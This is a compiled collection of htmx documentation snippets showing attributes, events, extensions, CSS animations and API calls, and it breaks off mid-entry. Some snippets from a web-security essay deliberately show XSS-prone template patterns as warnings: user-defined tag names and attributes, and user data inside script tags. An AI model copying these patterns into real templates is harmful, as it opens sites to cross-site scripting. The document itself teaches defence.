css\nCODE:\n```\n.progress {\n    height: 20px;\n    margin-bottom: 20px;\n    overflow: hidden;\n    background-color: #f5f5f5;\n    border-radius: 4px;\n    box-shadow: inset 0 1px 2px rgba(0,0,0,.1);\n}\n.progress-bar {\n    float: left;\n    width: 0%;\n    height: 100%;\n    font-size: 12px;\n    line-height: 20px;\n    color: #fff;\n    text-align: center;\n    background-color: #337ab7;\n    -webkit-box-shadow: inset 0 -1px 0 rgba(0,0,0,.15);\n    box-shadow: inset 0 -1px 0 rgba(0,0,0,.15);\n    -webkit-transition: width .6s ease;\n    -o-transition: width .6s ease;\n    transition: width .6s ease;\n}\n#restart-btn {\n  opacity:0;\n}\n#restart-btn.show {\n  opacity:1;\n  transition: opacity 100ms ease-in;\n}\n```\n\n----------------------------------------\n\nTITLE: Handling an Event with JSON Details\nDESCRIPTION: This JavaScript snippet shows how to access data passed through the `HX-Trigger` header using JSON format.  The triggered event's `detail.value` property contains the message sent from the server.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/headers/hx-trigger.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\ndocument.body.addEventListener(\"showMessage\", function(evt){\n    alert(evt.detail.value);\n})\n```\n\n----------------------------------------\n\nTITLE: CSS Styling for Validation Feedback\nDESCRIPTION: This CSS provides visual feedback to the user based on the validation state of the input fields. It styles the input's box-shadow with different colors depending on whether the input has an error or is valid.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/inline-validation.md#_snippet_2\n\nLANGUAGE: css\nCODE:\n```\n  .error-message {\n    color:red;\n  }\n  .error input {\n      box-shadow: 0 0 3px #CC0000;\n   }\n  .valid input {\n      box-shadow: 0 0 3px #36cc00;\n   }\n```\n\n----------------------------------------\n\nTITLE: Monitoring DOM events in Javascript using monitorEvents()\nDESCRIPTION: This JavaScript snippet demonstrates how to monitor events on a specific DOM element using the `monitorEvents()` method available in the browser console. It finds the element with the id 'theElement' using `htmx.find()` and then monitors all events occurring on that element, printing them to the console for debugging purposes. This is helpful for observing DOM events and understanding event flow in htmx applications.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_44\n\nLANGUAGE: javascript\nCODE:\n```\nmonitorEvents(htmx.find(\"#theElement\"));\n```\n\n----------------------------------------\n\nTITLE: Django Template Example with hx-confirm\nDESCRIPTION: This snippet demonstrates how to use the hx-confirm attribute within a Django template to dynamically generate confirmation messages. It loops through a list of clients and creates a delete button for each, embedding the client's name in the confirmation message.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/confirm.md#_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n{% for client in clients %}\n<button hx-post=\"/delete/{{client.pk}}\" hx-confirm=\"Delete {{client.name}}??\">Delete</button>\n{% endfor %}\n```\n\n----------------------------------------\n\nTITLE: hx-sync Abort Example (HTML)\nDESCRIPTION: This example demonstrates using hx-sync with the 'abort' strategy to resolve a race condition between a form's submit request and an individual input's validation request. The input's validation request is aborted if a form request is present or starts while the input request is in flight.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-sync.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<form hx-post=\"/store\">\n    <input id=\"title\" name=\"title\" type=\"text\" \n        hx-post=\"/validate\" \n        hx-trigger=\"change\"\n        hx-sync=\"closest form:abort\">\n    <button type=\"submit\">Submit</button>\n</form>\n```\n\n----------------------------------------\n\nTITLE: Replacing URL with hx-replace-url: true in htmx\nDESCRIPTION: Demonstrates using `hx-replace-url=\"true\"` to replace the current URL in the browser's location history after an htmx request. The `hx-get` attribute triggers a GET request to `/account`. After the response, the URL in the browser's address bar will be updated to `/account`.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-replace-url.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<div hx-get=\"/account\" hx-replace-url=\"true\">\n  Go to My Account\n</div>\n```\n\n----------------------------------------\n\nTITLE: Receiving Unnamed Events - HTML\nDESCRIPTION: This snippet demonstrates how to receive unnamed events from an SSE server using the `sse-swap` attribute. If your server sends an unnamed message, then you must listen for it by including `sse-swap=\"message\"`.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/sse.md#_snippet_5\n\nLANGUAGE: HTML\nCODE:\n```\n<div hx-ext=\"sse\" sse-connect=\"/event-source\" sse-swap=\"message\"></div>\n```\n\n----------------------------------------\n\nTITLE: htmx Active Search Example\nDESCRIPTION: This example demonstrates an active search using htmx.  The `hx-get` attribute issues a GET request to `/trigger_delay` when the input value changes.  The `hx-trigger` attribute specifies a `keyup changed delay:500ms` trigger, meaning the request is sent 500ms after a key is released and only if the value has changed.  The results are placed in the element with the id `search-results`.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_12\n\nLANGUAGE: HTML\nCODE:\n```\n<input type=\"text\" name=\"q\"\n    hx-get=\"/trigger_delay\"\n    hx-trigger=\"keyup changed delay:500ms\"\n    hx-target=\"#search-results\"\n    placeholder=\"Search...\">\n<div id=\"search-results\"></div>\n```\n\n----------------------------------------\n\nTITLE: SSE Message Example - Text\nDESCRIPTION: This is an example of an SSE message with an event name. The message consists of an event name and a data packet.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/sse.md#_snippet_9\n\nLANGUAGE: txt\nCODE:\n```\nevent: EventName\ndata: <div>Content to swap into your HTML page.</div>\n```\n\n----------------------------------------\n\nTITLE: Including CSRF Token in HTML element via hx-headers\nDESCRIPTION: This HTML snippet demonstrates how to include a CSRF token in the HTTP request header for all requests originating from within the HTML document or body. The `hx-headers` attribute is used to add the `X-CSRF-TOKEN` header with a placeholder value. This ensures that every request includes the CSRF token.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_58\n\nLANGUAGE: HTML\nCODE:\n```\n<html lang=\"en\" hx-headers='{\"X-CSRF-TOKEN\": \"CSRF_TOKEN_INSERTED_HERE\"}'>\n    :\n</html>\n```\n\n----------------------------------------\n\nTITLE: Confirming Requests with htmx:confirm Event using Sweet Alert (JavaScript)\nDESCRIPTION: This JavaScript code snippet demonstrates how to use the `htmx:confirm` event to implement asynchronous request confirmation using the SweetAlert library.  It listens for the `htmx:confirm` event on the document body, checks if the event target has the `confirm-with-sweet-alert='true'` attribute, and if so, prevents the default request, displays a SweetAlert confirmation dialog. If confirmed, it issues the request using `evt.detail.issueRequest()`. Requires SweetAlert library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_30\n\nLANGUAGE: javascript\nCODE:\n```\ndocument.body.addEventListener('htmx:confirm', function(evt) {\n  if (evt.target.matches(\"[confirm-with-sweet-alert='true']\")) {\n    evt.preventDefault();\n    swal({\n      title: \"Are you sure?\",\n      text: \"Are you sure you are sure?\",\n      icon: \"warning\",\n      buttons: true,\n      dangerMode: true,\n    }).then((confirmed) => {\n      if (confirmed) {\n        evt.detail.issueRequest();\n      }\n    });\n  }\n});\n```\n\n----------------------------------------\n\nTITLE: Editable Table Row with HTMX Actions\nDESCRIPTION: This HTML snippet defines the editable table row with input fields for name and email. It includes HTMX attributes for handling the 'cancel' event, sending a GET request to revert to the read-only state, and a PUT request to save the changes. hx-include is used to include the input values in the PUT request.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/edit-row.md#_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<tr hx-trigger='cancel' class='editing' hx-get=\"/contact/${contact.id}\">\n  <td><input autofocus name='name' value='${contact.name}'></td>\n  <td><input name='email' value='${contact.email}'></td>\n  <td>\n    <button class=\"btn danger\" hx-get=\"/contact/${contact.id}\">\n      Cancel\n    </button>\n    <button class=\"btn danger\" hx-put=\"/contact/${contact.id}\" hx-include=\"closest tr\">\n      Save\n    </button>\n  </td>\n</tr>\n```\n\n----------------------------------------\n\nTITLE: HTML Hypermedia Response Example\nDESCRIPTION: This HTML snippet demonstrates a hypermedia response. It includes account information and links to related actions like deposits and withdrawals.  The presence or absence of links determines available actions, allowing the server to control client behavior without explicit API versioning.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/two-approaches-to-decoupling.md#_snippet_2\n\nLANGUAGE: html\nCODE:\n```\nHTTP/1.1 200 OK\n\n<html>\n  <body>\n    <div>Account number: 12345</div>\n    <div>Balance: $100.00 USD</div>\n    <div>Links:\n        <a href=\"/accounts/12345/deposits\">deposits</a>\n        <a href=\"/accounts/12345/withdrawals\">withdrawals</a>\n    </div>\n  <body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: hx-preserve Relocation Example HTML\nDESCRIPTION: This example demonstrates how `hx-preserve` can be used to relocate an element within the DOM during an htmx update. The `video` element with `id=\"video\"` will be moved to the `new_location` div if it exists in the response.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-preserve.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<div id=\"new_location\">\n  Just relocated the video here\n  <div id=\"video\" hx-preserve></div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Installing htmx Head Support Extension via npm\nDESCRIPTION: This snippet shows how to install the `head-support` extension using npm. It is intended for npm-style build systems where the extension is managed as a node module.  After installation, the extension needs to be bundled with the core htmx library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/head-support.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install htmx-ext-head-support\n```\n\n----------------------------------------\n\nTITLE: Preventing XSS with User-Defined Tag Names and Attributes (HTML)\nDESCRIPTION: This example showcases the dangers of allowing users to control HTML tag names or attributes. Arbitrary tag names and attributes from user input can lead to XSS attacks. User-defined attribute values can sometimes be safe, depending on the specific use case and context.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/web-security-basics-with-htmx.md#_snippet_8\n\nLANGUAGE: HTML\nCODE:\n```\n<!-- Don't allow user-defined tag names -->\n<{{ user.tag }}></{{ user.tag }}>\n\n<!-- Don't allow user-defined attributes -->\n<a {{ user.attribute }}></a>\n\n<!-- User-defined attribute VALUES are sometimes okay, it depends -->\n<a class=\"{{ user.class }}\"></a>\n\n<!-- Escaped content is always safe inside HTML tags (this is fine) -->\n<a>{{ user.name }}</a>\n```\n\n----------------------------------------\n\nTITLE: htmx Route Initialization (JavaScript)\nDESCRIPTION: This JavaScript code initializes the routes for the demo using an `init` function (presumably provided by the `demoenv()` context, which is not fully defined here but implied). It sets up a route for `/demo` that returns a table populated with contacts. It also registers a GET route for `/contacts` which expects a page parameter and returns a partial template with the row data to append.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/infinite-scroll.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n    init(\"/demo\", function(request, params){\n      var contacts = dataStore.contactsForPage(1)\n      return tableTemplate(contacts)\n    });\n    \n    onGet(/\\/contacts.*/, function(request, params){\n      var page = parseInt(params['page']);\n      var contacts = dataStore.contactsForPage(page)\n      return rowsTemplate(page, contacts);\n    });\n```\n\n----------------------------------------\n\nTITLE: Customizing indicator styles with CSS\nDESCRIPTION: This CSS snippet provides an alternative approach to displaying the indicator. Instead of using opacity, it uses the `display` property.  The `my-indicator` class is initially set to `display: none`, and when the `htmx-request` class is added to a parent element, the `display` property changes to `inline`.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-indicator.md#_snippet_2\n\nLANGUAGE: CSS\nCODE:\n```\n    .my-indicator{\n        display:none;\n    }\n    .htmx-request .my-indicator{\n        display:inline;\n    }\n    .htmx-request.my-indicator{\n        display:inline;\n    }\n```\n\n----------------------------------------\n\nTITLE: Using hx-on:: for htmx Events in HTML\nDESCRIPTION: Shows the shorthand syntax `hx-on::` for handling htmx events. This simplifies event handling by omitting the \"htmx\" prefix. Two equivalent examples are provided, demonstrating the conciseness of the shorthand.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-on.md#_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n<!-- These two are equivalent -->\n<button hx-get=\"/info\" hx-on:htmx:before-request=\"alert('Making a request!')\">\n    Get Info!\n</button>\n\n<button hx-get=\"/info\" hx-on::before-request=\"alert('Making a request!')\">\n    Get Info!\n</button>\n```\n\n----------------------------------------\n\nTITLE: CSS Styling - Color Throb Demo Style\nDESCRIPTION: Defines the CSS style for the color throb demo, specifically applying a 1-second ease-in transition to all properties of elements with the `.smooth` class. This enables smooth animations when the element's properties are changed via htmx.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/animations.md#_snippet_1\n\nLANGUAGE: css\nCODE:\n```\n.smooth {\n  transition: all 1s ease-in;\n}\n```\n\n----------------------------------------\n\nTITLE: JavaScript HTML escaping function\nDESCRIPTION: This JavaScript function, `escapeHtmlText`, escapes HTML characters to prevent XSS vulnerabilities. It replaces characters like `<`, `>`, `&`, `\"`, `'`, `/`, `` ` ``, and `=` with their corresponding HTML entities.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/web-security-basics-with-htmx.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\n/**\n * Replace any characters that could be used to inject a malicious script in an HTML context.\n */\nexport function escapeHtmlText (value) {\n  const stringValue = value.toString()\n  const entityMap = {\n    '&': '&amp;',\n    '<': '&lt;',\n    '>': '&gt;',\n    '\"': '&quot;',\n    \"'\": '&#x27;',\n    '/': '&#x2F;',\n    '`': '&grave;',\n    '=': '&#x3D;'\n  }\n\n  // Match any of the characters inside /[ ... ]/\n  const regex = /[&<>\"'`=/]/g\n  return stringValue.replace(regex, match => entityMap[match])\n}\n```\n\n----------------------------------------\n\nTITLE: Get Form Values with htmx.values() - JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates how to use the `htmx.values` function to retrieve the values associated with a form element. It uses `htmx.find` to locate the form element with the ID \"#myForm\" and then calls `htmx.values` to get the form data.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_24\n\nLANGUAGE: js\nCODE:\n```\n  // gets the values associated with this form\n  var values = htmx.values(htmx.find(\"#myForm\"));\n```\n\n----------------------------------------\n\nTITLE: Example head tag in an existing document\nDESCRIPTION: This is an example HTML snippet showing a `<head>` section with several `<link>` and `<script>` tags. This example serves as a basis for demonstrating how the `head-support` extension merges changes from new `<head>` content.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/head-support.md#_snippet_4\n\nLANGUAGE: HTML\nCODE:\n```\n<head>\n<link rel=\"stylesheet\" href=\"https://the.missing.style\">\n<link rel=\"stylesheet\" href=\"/css/site1.css\">\n<script src=\"/js/script1.js\"></script>\n<script src=\"/js/script2.js\"></script>\n</head>\n```\n\n----------------------------------------\n\nTITLE: Preventing XSS in Script Tags (HTML)\nDESCRIPTION: This code snippet demonstrates the importance of not directly embedding user-provided data within `<script>` tags to prevent potential Cross-Site Scripting (XSS) vulnerabilities. Even with auto-escaping, user-defined content should not be placed directly into script contexts.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/web-security-basics-with-htmx.md#_snippet_6\n\nLANGUAGE: HTML\nCODE:\n```\n<!-- Don't include inside script tags -->\n<script>\n  const userName = {{ user.name }}\n</script>\n```\n\n----------------------------------------\n\nTITLE: Finding an Element with htmx.find() (JavaScript)\nDESCRIPTION: This snippet demonstrates how to find a single element in the DOM using the `htmx.find()` method.  It can either take a selector string or a root element and a selector string. The first example finds a div with a specific ID, and the second finds another div within the first one.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\n// find div with id my-div\nvar div = htmx.find(\"#my-div\")\n\n// find div with id another-div within that div\nvar anotherDiv = htmx.find(div, \"#another-div\")\n```\n\n----------------------------------------\n\nTITLE: Modal HTML Fragment\nDESCRIPTION: This HTML fragment defines the structure of the modal dialog. It includes a `<div>` with id 'modal', an underlay for click-to-dismiss, and the actual modal content. It utilizes Hyperscript to handle the closing animation and removal of the modal from the DOM.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/modal-custom.md#_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n<div id=\"modal\" _=\"on closeModal add .closing then wait for animationend then remove me\">\n\t<div class=\"modal-underlay\" _=\"on click trigger closeModal\"></div>\n\t<div class=\"modal-content\">\n\t\t<h1>Modal Dialog</h1>\n\t\tThis is the modal content.\n\t\tYou can put anything here, like text, or a form, or an image.\n\t\t<br>\n\t\t<br>\n\t\t<button class=\"btn danger\" _=\"on click trigger closeModal\">Close</button>\n\t</div>\n</div>\n```\n\n----------------------------------------\n\nTITLE: JavaScript Handler - Fade In Demo\nDESCRIPTION: This JavaScript code defines a handler for the `/fade_me_in` endpoint. It returns the HTML for the button itself, effectively replacing the existing button with a new one, triggering the fade-in animation.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/animations.md#_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nonPost(\"/fade_me_in\", function () {return \"<button id=\\\"fade-me-in\\\"\\n\"+\n                                               \"        class=\\\"btn primary\\\"\\n\"+\n                                               \"        hx-post=\\\"/fade_me_in\\\"\\n\"+\n                                               \"        hx-swap=\\\"outerHTML settle:1s\\\">\\n\"+\n                                               \"        Fade Me In\\n\"+\n                                               \"</button>\"});\n```\n\n----------------------------------------\n\nTITLE: Prompting with hx-prompt\nDESCRIPTION: This snippet shows how to display a prompt to the user before sending a request using htmx's `hx-prompt`. Prompts the user for input and includes it in the request. Requires the htmx library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-intercooler.md#_snippet_12\n\nLANGUAGE: html\nCODE:\n```\nhx-prompt\n```\n\n----------------------------------------\n\nTITLE: hx-sync Replace Example (HTML)\nDESCRIPTION: This example showcases using hx-sync with the 'replace' strategy on the form tag to prioritize the submit request over all input validation requests. This will cancel any in-flight validation requests and issue only the hx-post=\"/store\" request.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-sync.md#_snippet_2\n\nLANGUAGE: HTML\nCODE:\n```\n<form hx-post=\"/store\" hx-sync=\"this:replace\">\n    <input id=\"title\" name=\"title\" type=\"text\" hx-post=\"/validate\" hx-trigger=\"change\" />\n    <button type=\"submit\">Submit</button>\n</form>\n```\n\n----------------------------------------\n\nTITLE: Example of a new head tag received by htmx\nDESCRIPTION: This is an example HTML snippet representing a new `<head>` section that htmx receives as a response.  It contains different `<link>` and `<script>` tags compared to the original `<head>`, which are used to demonstrate the merging behavior of the `head-support` extension.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/head-support.md#_snippet_5\n\nLANGUAGE: HTML\nCODE:\n```\n<head>\n<link rel=\"stylesheet\" href=\"https://the.missing.style\">\n<link rel=\"stylesheet\" href=\"/css/site2.css\">\n<script src=\"/js/script2.js\"></script>\n<script src=\"/js/script3.js\"></script>\n</head>\n```\n\n----------------------------------------\n\nTITLE: Defining CSS Animations for View Transitions\nDESCRIPTION: This CSS defines animations for fading in/out and sliding content during view transitions. It utilizes keyframes and the ::view-transition-old and ::view-transition-new pseudo-elements to target the old and new content during the transition. A CSS class 'sample-transition' is defined to tie the view transition to elements.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/view-transitions.md#_snippet_3\n\nLANGUAGE: CSS\nCODE:\n```\n   @keyframes fade-in {\n     from { opacity: 0; }\n   }\n\n   @keyframes fade-out {\n     to { opacity: 0; }\n   }\n\n   @keyframes slide-from-right {\n     from { transform: translateX(90px); }\n   }\n\n   @keyframes slide-to-left {\n     to { transform: translateX(-90px); }\n   }\n\n   /* define animations for the old and new content */\n   ::view-transition-old(slide-it) {\n     animation: 180ms cubic-bezier(0.4, 0, 1, 1) both fade-out,\n     600ms cubic-bezier(0.4, 0, 0.2, 1) both slide-to-left;\n   }\n   ::view-transition-new(slide-it) {\n     animation: 420ms cubic-bezier(0, 0, 0.2, 1) 90ms both fade-in,\n     600ms cubic-bezier(0.4, 0, 0.2, 1) both slide-from-right;\n   }\n\n   /* tie the view transition to a given CSS class */\n   .sample-transition {\n       view-transition-name: slide-it;\n   }\n```\n\n----------------------------------------\n\nTITLE: Including htmx via CDN\nDESCRIPTION: This code snippet shows how to include the htmx library in an HTML file using a CDN (Content Delivery Network). It specifies the version 2.0.0-beta1 of htmx.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/posts/2024-03-15-htmx-2.0.0-beta1-is-released.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<script src=\"https://unpkg.com/htmx.org@2.0.0-beta1/dist/htmx.min.js\"></script>\n```\n\n----------------------------------------\n\nTITLE: Triggering Modal Load with HTMX & Hyperscript\nDESCRIPTION: This HTML snippet defines a button that triggers a GET request to load modal content using HTMX. The `hx-get` attribute specifies the endpoint, and `hx-target` determines where the content will be inserted. Hyperscript is used to add the 'uk-open' class to the modal after the content is loaded, triggering UIKit's animation. The `wait` command ensures the animation renders correctly.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/modal-uikit.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<button \n\tid=\"showButton\"\n\thx-get=\"/uikit-modal.html\" \n\thx-target=\"#modals-here\" \n\tclass=\"uk-button uk-button-primary\" \n\t_=\"on htmx:afterOnLoad wait 10ms then add .uk-open to #modal\">Open Modal</button>\n\n<div id=\"modals-here\"></div>\n```\n\n----------------------------------------\n\nTITLE: hx-swap with show modifier and window target\nDESCRIPTION: This example shows how to use the `show` modifier to scroll to the top of the window after the content from `/example` is swapped into the current div.  `window:top` is used as the target for the scrolling.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-swap.md#_snippet_6\n\nLANGUAGE: html\nCODE:\n```\n  <!-- this will get some content and swap it into the current div, then ensure that the viewport is scrolled to the\n       very top -->\n  <div hx-get=\"/example\" \n       hx-swap=\"innerHTML show:window:top\">\n    Get Some Content\n  </div>\n```\n\n----------------------------------------\n\nTITLE: HTML Form Setup with hx-post Trigger for SortableJS\nDESCRIPTION: This HTML snippet demonstrates how to set up a form with htmx to automatically trigger a POST request when a sortable list's order changes, using the SortableJS library. The `hx-post` attribute specifies the endpoint, and `hx-trigger=\"end\"` ties the request to the SortableJS 'end' event.  A loading indicator is also included.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_50\n\nLANGUAGE: html\nCODE:\n```\n<form class=\"sortable\" hx-post=\"/items\" hx-trigger=\"end\">\n    <div class=\"htmx-indicator\">Updating...</div>\n    <div><input type='hidden' name='item' value='1'/>Item 1</div>\n    <div><input type='hidden' name='item' value='2'/>Item 2</div>\n    <div><input type='hidden' name='item' value='2'/>Item 3</div>\n</form>\n```\n\n----------------------------------------\n\nTITLE: Disabling Form Elements with hx-disabled-elt - HTML\nDESCRIPTION: This example demonstrates how to disable multiple form elements (text inputs and buttons) using the hx-disabled-elt attribute. It targets elements using CSS selectors with the 'find' prefix within the form during the htmx POST request.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-disabled-elt.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<form hx-post=\"/example\" hx-disabled-elt=\"find input[type='text'], find button\">\n    <input type=\"text\" placeholder=\"Type here...\">\n    <button type=\"submit\">Send</button>\n</form>\n```\n\n----------------------------------------\n\nTITLE: CSS Styling - Fade In On Addition\nDESCRIPTION: Defines the CSS style for the fade-in animation. The `htmx-added` class is used to initially set the opacity to 0, and then the transition is applied to the element when it has an id of \"fade-me-in\".\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/animations.md#_snippet_7\n\nLANGUAGE: css\nCODE:\n```\n#fade-me-in.htmx-added {\n  opacity: 0;\n}\n#fade-me-in {\n  opacity: 1;\n  transition: opacity 1s ease-out;\n}\n```\n\n----------------------------------------\n\nTITLE: JavaScript Handler - Request In Flight Demo\nDESCRIPTION: This JavaScript code defines a handler for the `/name` endpoint. It simply returns the string \"Submitted!\", which htmx then uses to replace the form, indicating that the submission was successful.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/animations.md#_snippet_11\n\nLANGUAGE: javascript\nCODE:\n```\nonPost(\"/name\", function(){ return \"Submitted!\"; });\n```\n\n----------------------------------------\n\nTITLE: Embedding a YouTube Video with hx-preserve in htmx\nDESCRIPTION: This snippet embeds a YouTube video using an iframe and utilizes the hx-preserve=\"true\" attribute. This attribute, combined with the moveBefore() API, ensures that the video's state (e.g., playback position) is preserved when the iframe is moved to a different location in the DOM during an htmx update. The View Details link triggers a boosted request to another page with a different DOM structure.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/move-before/_index.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<iframe hx-preserve=\"true\" id=\"rick-roll\" width=\"617\" height=\"351\" src=\"https://www.youtube.com/embed/dQw4w9WgXcQ\" \n          title=\"Rick Astley - Never Gonna Give You Up (Official Music Video)\" frameborder=\"0\" \n          allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\" \n          referrerpolicy=\"strict-origin-when-cross-origin\" allowfullscreen></iframe>\n```\n\nLANGUAGE: html\nCODE:\n```\n<a hx-boost=\"true\" href=\"/examples/move-before/details\">View Details &rarr;</a>\n```\n\n----------------------------------------\n\nTITLE: JavaScript Handler - View Transitions Demo\nDESCRIPTION: This JavaScript code defines handlers for the `/new-content` and `/original-content` endpoints. These handlers return different HTML content, allowing the button to swap between \"New Content\" and \"Initial Content\", triggering the view transition.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/animations.md#_snippet_16\n\nLANGUAGE: javascript\nCODE:\n```\nvar originalContent = htmx.find(\".slide-it\").innerHTML;\n\n    this.server.respondWith(\"GET\", \"/new-content\", function(xhr){\n        xhr.respond(200,  {}, \"<h1>New Content</h1> <button class='btn danger' hx-get='/original-content' hx-swap='innerHTML transition:true' hx-target='closest div'>Restore It! </button>\")\n    });\n\n    this.server.respondWith(\"GET\", \"/original-content\", function(xhr){\n        xhr.respond(200,  {}, originalContent)\n    });\n```\n\n----------------------------------------\n\nTITLE: Enabling htmx Head Support Extension\nDESCRIPTION: This snippet demonstrates how to enable the `head-support` extension by adding the `hx-ext` attribute to the `<body>` tag. This activates the head tag merging functionality of the extension, allowing htmx to process `<head>` tags in server responses.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/head-support.md#_snippet_3\n\nLANGUAGE: HTML\nCODE:\n```\n<body hx-ext=\"head-support\">\n...\n</body>\n```\n\n----------------------------------------\n\nTITLE: Swapping HTML Content with htmx (JavaScript)\nDESCRIPTION: This snippet demonstrates how to swap HTML content using the `htmx.swap()` method. It takes a target, content, and swap specification as parameters. It shows how to swap the inner HTML of an element with a new string.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_20\n\nLANGUAGE: javascript\nCODE:\n```\n// swap #output element inner HTML with div element with \"Swapped!\" text\nhtmx.swap(\"#output\", \"<div>Swapped!</div>\", {swapStyle: 'innerHTML'});\n```\n\n----------------------------------------\n\nTITLE: Overriding WebSocket Creation in htmx (JavaScript)\nDESCRIPTION: This snippet demonstrates how to override the default WebSocket creation in htmx using the `htmx.createWebSocket` property. It takes a URL and returns a new WebSocket instance with a specified protocol. This customization allows for specific WebSocket setups.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\n// override WebSocket to use a specific protocol\nhtmx.createWebSocket = function(url) {\n  return new WebSocket(url, ['wss']);\n};\n```\n\n----------------------------------------\n\nTITLE: Install htmx using npm\nDESCRIPTION: This snippet shows the command to install htmx using npm.  It specifies the correct package name (`htmx.org`) to avoid installing an older, broken package.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/README.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install htmx.org --save\n```\n\n----------------------------------------\n\nTITLE: Adding Dynamic Custom Headers with hx-headers & JavaScript in htmx\nDESCRIPTION: This snippet shows how to add a dynamic custom header to an htmx AJAX request using the hx-headers attribute and JavaScript evaluation.  The 'js:' prefix indicates that the value is a JavaScript expression that will be evaluated. Make sure that the calculateValue() function is defined in your JavaScript code.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-headers.md#_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n  <div hx-get=\"/example\" hx-headers='js:{myVal: calculateValue()}'>Get Some HTML, Including a Dynamic Custom Header from Javascript in the Request</div>\n```\n\n----------------------------------------\n\nTITLE: HTML Configuring htmx to Swap All Responses (Meta Tag)\nDESCRIPTION: Shows how to configure htmx to swap all responses regardless of the HTTP status code using a `<meta>` tag. This overrides the default behavior where error responses are not swapped.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/QUIRKS.md#_snippet_6\n\nLANGUAGE: HTML\nCODE:\n```\n  <meta name=\"htmx-config\" content='{\"responseHandling\": [{\"code\":\"...\", \"swap\": true}]}'/>\n```\n\n----------------------------------------\n\nTITLE: Handling Tab Requests (JavaScript)\nDESCRIPTION: These JavaScript functions handle GET requests for each tab endpoint ('/tab1', '/tab2', '/tab3').  Each function returns HTML markup that includes the tab list with the appropriate tab marked as 'selected', along with the corresponding tab content.  The 'onGet' function is assumed to be a server-side function that handles HTTP GET requests.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/tabs-hateoas.md#_snippet_3\n\nLANGUAGE: 